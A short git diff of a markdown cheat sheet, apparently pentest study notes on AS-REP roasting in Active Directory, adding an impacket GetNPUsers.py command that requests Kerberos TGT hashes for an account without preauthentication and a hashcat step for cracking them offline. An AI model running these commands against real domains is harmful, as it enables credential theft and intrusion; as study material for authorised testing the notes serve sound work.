@@ -16,9 +16,13 @@ Get TGT from a specic AD account where preauth is disabled using a valid domain 
 
 ```
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+
+OR
+
+GetNPUsers.py -dc-ip 192.168.200.70  -request -outputfile hashes.asreproast corp.com/pete
 ```
 
-Crack TGR offline
+Crack TGT offline
 
 ```
 hashcat --help | grep -i "Kerberos"
